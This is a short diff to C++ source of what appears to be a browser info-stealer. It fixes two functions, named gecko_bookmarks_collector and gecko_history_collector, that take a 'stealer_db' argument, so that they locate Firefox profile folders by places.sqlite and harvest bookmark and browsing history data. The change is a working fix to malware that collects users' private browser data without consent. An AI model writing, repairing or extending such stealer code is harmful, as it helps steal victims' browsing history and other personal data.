@@ -189,7 +189,7 @@ BOOL gecko_bookmarks_collector(std::string username, std::string stealer_db)
 		try {
 			if (exists(target_user_data) && is_directory(target_user_data)) {
 				for (const auto& entry : directory_iterator(target_user_data)) {
-					if (entry.is_directory() && exists(entry.path() / "cookies.sqlite")) {
+					if (entry.is_directory() && exists(entry.path() / "places.sqlite")) {
 						//std::cout << entry.path() << '\n';
 
 						target_bookmark_data = entry.path().string() + "\\places.sqlite";
@@ -283,7 +283,7 @@ BOOL gecko_history_collector(std::string username, std::string stealer_db)
 		try {
 			if (exists(target_user_data) && is_directory(target_user_data)) {
 				for (const auto& entry : directory_iterator(target_user_data)) {
-					if (entry.is_directory() && exists(entry.path() / "cookies.sqlite")) {
+					if (entry.is_directory() && exists(entry.path() / "places.sqlite")) {
 						//std::cout << entry.path() << '\n';
 
 						target_history_data = entry.path().string() + "\\places.sqlite";
